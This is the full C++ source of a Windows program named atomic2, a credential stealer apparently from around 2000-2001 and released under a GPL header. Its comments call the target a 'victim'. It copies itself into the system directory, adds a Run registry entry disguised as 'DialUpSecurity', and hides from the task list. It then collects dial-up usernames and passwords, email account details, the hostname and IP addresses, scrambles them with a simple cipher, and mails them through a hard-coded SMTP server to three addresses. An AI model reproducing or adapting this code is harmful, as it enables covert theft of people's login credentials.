/*
Copyright (C) 2000-2001 Marius David.

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  

See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

*/
// atomic2.cpp

#include "stdafx.h"

#include <ras.h>
#include <stdlib.h>
#include <stdio.h>
#include "arena_winsock.h"
#include "arena_registry.h"


#define RSP_SIMPLE_SERVICE     1        // registers app as a service

#define RSP_UNREGISTER_SERVICE 0        // unregisters app as a service

#define DEF_MSGTITLE "NOOP"             // message box title

#define DEF_MESSAGE "Are you sure you want to apply this patch ?"
                                        // message box text

#define DEF_REGKEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                                        // the registry key under wich the
                                        // registry value is stored

#define DEF_REGVALUE "DialUpSecurity"   // the registry value where exe_path
                                        // is stored

#define DEF_CHECKFILE "rasxnfo.dll"     // this file is used to check if the
                                        // ras informations have changed

#define DEF_SAVEFILE "rasxnft.dll"      // this file is used for saving ras
                                        // informations even if there is no
                                        // connection to the internet.
                                        // it is useful if you have access to
                                        // the victim's system directory.

#define DEF_EXENAME "dialupsc.exe"      // this will be set when the program
                                        // copyies itself to the system directory

#define DEF_TO1 "RCPT TO:<addr1@server.com>\r\n"
#define DEF_TO2 "RCPT TO:<addr2@server.com>\r\n"
#define DEF_TO3 "RCPT TO:<addr3@server.com>\r\n"
                                        // the email will be sent to this adresses

#define DEF_SMTPIP "13.26.8.26"         // the SMTP server

#define DEF_HELO "HELO domain.com\r\n"  // the HELO command issued to SMTP server

#define DEF_FROM "MAIL FROM:<atomic2@domain.com>\r\n"
                                        // the MAIL command issued to SMTP server

#define DEF_MUTEX1 "sting"              // name for the first mutex
#define DEF_MUTEX2 "desertrose"         // name for the second mutex

//---------------------------------------------------------------------------
typedef struct RASENTRYX
{
  DWORD      dwSize;
  DWORD      dwfOptions;
  //
  // Location/phone number.
  //
  DWORD      dwCountryID;
  DWORD      dwCountryCode;
  TCHAR      szAreaCode[ RAS_MaxAreaCode + 1 ];
  TCHAR      szLocalPhoneNumber[ RAS_MaxPhoneNumber + 1 ];
  DWORD      dwAlternateOffset;
  //
  // PPP/Ip
  //
  RASIPADDR  ipaddr;
  RASIPADDR  ipaddrDns;
  RASIPADDR  ipaddrDnsAlt;
  RASIPADDR  ipaddrWins;
  RASIPADDR  ipaddrWinsAlt;
  //
  // Framing
  //
  DWORD      dwFrameSize;
  DWORD      dwfNetProtocols;
  DWORD      dwFramingProtocol;
  //
  // Scripting
  //
  TCHAR      szScript[ MAX_PATH ];
  //
  // AutoDial
  //
  TCHAR       szAutodialDll[ MAX_PATH ];
  TCHAR       szAutodialFunc[ MAX_PATH ];
  //
  // Device
  //
  TCHAR      szDeviceType[ RAS_MaxDeviceType + 1 ];
  TCHAR      szDeviceName[ RAS_MaxDeviceName + 1 ];
  //
  // X.25
  //
  TCHAR      szX25PadType[ RAS_MaxPadType + 1 ];
  TCHAR      szX25Address[ RAS_MaxX25Address + 1 ];
  TCHAR      szX25Facilities[ RAS_MaxFacilities + 1 ];
  TCHAR      szX25UserData[ RAS_MaxUserData + 1 ];
  DWORD      dwChannels;
  //
  // Reserved
  //
  DWORD       dwReserved1;
  DWORD       dwReserved2;
  /*//
  // Multilink
  //
  DWORD       dwSubEntries;
  DWORD       dwDialMode;
  DWORD       dwDialExtraPercent;
  DWORD       dwDialExtraSampleSeconds;
  DWORD       dwHangUpExtraPercent;
  DWORD       dwHangUpExtraSampleSeconds;
  //
  // Idle timeout
  //
  DWORD       dwIdleDisconnectSeconds;*/
} RASENTRYX;
//---------------------------------------------------------------------------
typedef struct RASDIALPARAMSX
{
  DWORD dwSize;
  CHAR  szEntryName[ RAS_MaxEntryName + 1 ];
  CHAR  szPhoneNumber[ RAS_MaxPhoneNumber + 1 ];
  CHAR  szCallbackNumber[ RAS_MaxCallbackNumber + 1 ];
  CHAR  szUserName[ UNLEN + 1 ];
  CHAR  szPassword[ PWLEN + 1 ];
  CHAR  szDomain[ DNLEN + 1 ];
} RASDIALPARAMSX;

typedef DWORD (__stdcall *pRegFunction)(DWORD, DWORD);

//---------------------------------------------------------------------------

char syspath[MAX_PATH + 1], apppath[500], sysapppath[500];
HINSTANCE hKernelLib;
pRegFunction RegisterServiceProcess;
char chValidChar[100]   = "<>(): -=,+/0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
char chEncodedChar[100] = "8,+uvw(opq56RScdefg)DIJKV> WXrsx/0MNhi:jTU9ABC=3OPQF<-4YZabklmnt12LE7GHyz";
//---------------------------------------------------------------------------
void encode(char *chText)
{
	unsigned int ctlen=strlen(chValidChar);
	for (unsigned int i=0; i<strlen(chText); i++)
		for (unsigned int j=0; j<ctlen; j++)
			if (chText[i]==chValidChar[j])
			{
				chText[i]=chEncodedChar[(j+i)%ctlen];
				break;
			}
};
//---------------------------------------------------------------------------
void decode(char *chText)
{
	unsigned int ctlen=strlen(chValidChar);
	for (unsigned int i=0; i<strlen(chText); i++)
		for (unsigned int j=0; j<ctlen; j++)
			if (chText[i]==chEncodedChar[j])
			{
				chText[i]=chValidChar[(ctlen-i%ctlen+j)%ctlen];
				break;
			}
};
//---------------------------------------------------------------------------
int result(char *r)
{
  char a[255];
  strcpy(a, r);
  a[3]=0;
  return atoi(a);
}
//---------------------------------------------------------------------------
int smtp(char *buffer)
{
  char msg[250];

  SOCKET c=ws_connect(DEF_SMTPIP, 25);
  if (c==INVALID_SOCKET)
    return -1;

  while (1)
  {
  ws_recieve(c, msg);
  if (result(msg)!=220)
    break;

  ws_send(c, DEF_HELO);
  ws_recieve(c, msg);
  if (result(msg)!=250)
    break;

  ws_send(c, DEF_FROM);
  ws_recieve(c, msg);
  if (result(msg)!=250)
    break;

  ws_send(c, DEF_TO1);
  ws_recieve(c, msg);
  if (result(msg)!=250)
    break;

  ws_send(c, DEF_TO2);
  ws_recieve(c, msg);
  if (result(msg)!=250)
    break;

  ws_send(c, DEF_TO3);
  ws_recieve(c, msg);
  if (result(msg)!=250)
    break;

  ws_send(c, "DATA\r\n");
  ws_recieve(c, msg);
  if (result(msg)!=354)
    break;

  strcat(buffer, "\r\n.\r\n");
  ws_send(c, buffer);
  ws_recieve(c, msg);
  if (result(msg)!=250)
    break;

  ws_send(c, "QUIT\r\n");
  ws_recieve(c, msg);
  break;
  }
  ws_deletesocket(c);
  return 0;
}
//---------------------------------------------------------------------------
int rasinfo(char *buffer)
{
  RASENTRYNAME *re;
  RASDIALPARAMSX rp;
  RASENTRYX entry;
  DWORD recb, reentries, entrylen;
  BOOL password;

  recb=sizeof(RASENTRYNAME)*50;
  entrylen=sizeof(RASENTRYX);

  re=new RASENTRYNAME[50];
  if (re==NULL)
    return -1;
  re[0].dwSize=sizeof(RASENTRYNAME);

  if (RasEnumEntries(NULL, NULL, re, &recb, &reentries))
  {
    delete re;
    return -1;
  }
  for (unsigned int i=0; i<reentries; i++)
  {
    memset(&rp, 0, sizeof(RASDIALPARAMSX));
    rp.dwSize=sizeof(RASDIALPARAMSX);
    strcpy(rp.szEntryName, re[i].szEntryName);
    memset(&entry, 0, sizeof(RASENTRYX));
    entry.dwSize=sizeof(RASENTRYX);

    if (RasGetEntryDialParams(NULL, (RASDIALPARAMS * FAR) &rp, &password))
      break;
    strcat(buffer, "<phone> ");
    if (RasGetEntryProperties(NULL, rp.szEntryName, (RASENTRY *) &entry,
        &entrylen, NULL, NULL))
      strcat(buffer, "phone_error");//rp.szPhoneNumber);
    else
      strcat(buffer, entry.szLocalPhoneNumber);
    strcat(buffer, "\r\n<username> ");
    strcat(buffer, rp.szUserName);
    strcat(buffer, "\r\n<password> ");
    if (password)
      strcat(buffer, rp.szPassword);
    else
      strcat(buffer, "password_error");
    strcat(buffer, "\r\n");
  }
  delete re;
  return 0;
}
//---------------------------------------------------------------------------
int rasactive(void)
{
  RASCONN *rc;
  rc=new RASCONN[50];
  DWORD rclen=sizeof(RASCONN)*50, nc;
  rc[0].dwSize=sizeof(RASCONN);
  if (RasEnumConnections(rc, &rclen, &nc))
  {
    delete rc;
    return 0;
  }
  delete rc;
  return nc;
}
//---------------------------------------------------------------------------
int savefile(char *fname, char *buffer)
{
  FILE *f;
  char name[500];
  strcpy(name, syspath);
  strcat(name, fname);
  f=fopen(name, "wb");
  if (f==NULL)
    return -1;
  fputs(buffer, f);
  fclose(f);
  return 0;
}
//---------------------------------------------------------------------------
int openfile(char *fname, char *buffer)
{
  FILE *f;
  char name[500];
  strcpy(name, syspath);
  strcat(name, fname);
  f=fopen(name, "rb");
  if (f==NULL)
    return -1;
  while (! feof(f))
  {
    name[0]=0;
    fgets(name, 5000, f);
    strcat(buffer, name);
  }
  fclose(f);
  return 0;
}
//---------------------------------------------------------------------------
int testfile(char *name)
{
  FILE *f;
  f=fopen(name, "rb");
  if (f==NULL)
    return -1;
  fclose(f);
  return 0;
}
//---------------------------------------------------------------------------
int infest(void)
{
  char cmdline[500];

  BOOL sw=FALSE;
  int j=0;
  strcpy(cmdline, GetCommandLine());
  for (unsigned int i=0; i<strlen(cmdline); i++)
    if (cmdline[i]=='\"')
      if (sw)
        break;
      else
        sw=TRUE;
    else
      apppath[j++]=cmdline[i];
  apppath[j]=0;

  if (OpenRegSubKey(DEF_REGKEY))
  {
    SetRegValueString(DEF_REGVALUE, sysapppath, TRUE);
    CloseRegSubKey();
  }

  CopyFile(apppath, sysapppath, FALSE);
  return 0;
}
//---------------------------------------------------------------------------
int hideapp(void)
{
  hKernelLib = LoadLibrary("kernel32.dll");
  if(hKernelLib)
  {
    RegisterServiceProcess = (pRegFunction)GetProcAddress(hKernelLib,
        "RegisterServiceProcess");
    if(RegisterServiceProcess)
    {
      RegisterServiceProcess(GetCurrentProcessId(), RSP_SIMPLE_SERVICE);
      return 0;
    }
  }
  return -1;
}
//---------------------------------------------------------------------------
int createprocess(char *path,char *params, char *startup)
{
  char p[500];
  strcpy(p, path);
  strcat(p, " ");
  strcat(p, params);
  STARTUPINFO SI;
  memset(&SI, 0, sizeof(STARTUPINFO));
  SI.cb=sizeof(STARTUPINFO);

  PROCESS_INFORMATION PI;
  if (CreateProcess(NULL, p, NULL, NULL, false,
      NORMAL_PRIORITY_CLASS | CREATE_DEFAULT_ERROR_MODE | CREATE_NEW_CONSOLE |
      CREATE_NEW_PROCESS_GROUP, NULL, startup, &SI, &PI))
  {
    WaitForInputIdle(PI.hProcess, 5000);
    return 1;
  }
  else
    return 0;
}
//---------------------------------------------------------------------------
int mb(char *title, char *msg)
{
  if (strcmp(title, "NOOP"))
    return MessageBox(NULL, msg, title, MB_OKCANCEL);
  return 0;
}
//---------------------------------------------------------------------------
int email(char *buffer)
{
  char entry[500], t[500];
  HKEY h;
  strcat(buffer, "\r\n<email accounts>");
  if (OpenRegSubKey("SOFTWARE\\Microsoft\\Internet Account Manager\\Accounts",
      HKEY_CURRENT_USER))
  {
    int i=0;
    while (EnumKey(i, entry))
    {
      h=GetHKEY();
      strcpy(t, "SOFTWARE\\Microsoft\\Internet Account Manager\\Accounts\\");
      strcat(t, entry);
      if (OpenRegSubKey(t, HKEY_CURRENT_USER))
      {
        if (GetRegValue("SMTP Display Name", (LPBYTE) t))
        {
          strcat(buffer, "\r\n  <name> ");
          strcat(buffer, t);
        }
        if (GetRegValue("SMTP Email Address", (LPBYTE) t))
        {
          strcat(buffer, "\r\n  <email> ");
          strcat(buffer, t);
        }
      }
      SetHKEY(h);
      i++;
    }
    CloseRegSubKey();
  }
  return 0;
}
//---------------------------------------------------------------------------
int hostinfo(char *buffer)
{
  char t[500];
  int count;
  char ips[20][16];
  strcat(buffer, "\r\n<hostname> ");
  ws_localname(t);
  strcat(buffer, t);
  strcat(buffer, "\r\n<hostips>\r\n");
  ws_nametoip(t, ips, count);
  for (int i=0; i<count; i++)
    strcat(buffer, ips[i]);
  return 0;
}
//---------------------------------------------------------------------------
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
  char buffer[5000], fbuffer[5000];
  BOOL m1=TRUE;

  if (! GetSystemDirectory(syspath, MAX_PATH + 1))
    strcpy(syspath, "c:\\windows\\system\\");
  if (syspath[strlen(syspath)-1]!='\\')
    strcat(syspath, "\\");
  strcpy(sysapppath, syspath);
  strcat(sysapppath, DEF_EXENAME);

  infest();
  CreateMutex(NULL, TRUE, DEF_MUTEX1);
  if (GetLastError()==ERROR_ALREADY_EXISTS)
  {
    m1=FALSE;
    CreateMutex(NULL, TRUE, DEF_MUTEX2);
    if (GetLastError()==ERROR_ALREADY_EXISTS)
    {
      mb(DEF_MSGTITLE, DEF_MESSAGE);
      return 0;
    }
  }
  createprocess(sysapppath, "", syspath);
  if (m1)
    return 0;
  hideapp();

  if (ws_init(1,1))
    return -1;

  buffer[0]=0; fbuffer[0]=0;

  rasinfo(buffer);
  hostinfo(buffer);
  email(buffer);
  encode(buffer);

  openfile(DEF_CHECKFILE, fbuffer);
  if (! strcmp(fbuffer, buffer))
  {
    ws_done();
    return 0;
  }
  strcpy(fbuffer, buffer);
  savefile(DEF_SAVEFILE, fbuffer);

  while (1)
  {
    if (rasactive())
      if (! smtp(buffer))
      {
        savefile(DEF_CHECKFILE, fbuffer);
        break;
      }
    Sleep(30000);
  }

  if(hKernelLib)
  {
    if(RegisterServiceProcess)
      RegisterServiceProcess(GetCurrentProcessId(), RSP_UNREGISTER_SERVICE);
    FreeLibrary(hKernelLib);
  }

  ws_done();
  return 0;
}
//---------------------------------------------------------------------------

